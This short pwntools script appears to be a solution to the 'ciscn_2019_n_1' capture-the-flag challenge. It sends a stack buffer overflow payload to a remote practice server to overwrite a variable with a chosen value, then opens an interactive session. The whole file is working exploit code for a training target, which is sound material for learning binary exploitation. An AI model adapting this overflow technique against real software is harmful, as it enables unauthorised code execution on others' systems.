from pwn import*
#p=process('./ciscn_2019_n_1')
p=remote('node4.anna.nssctf.cn',28932)
payload=b'a'*(0x30-0x04)+p64(0x41348000)
p.sendline(payload)
p.interactive()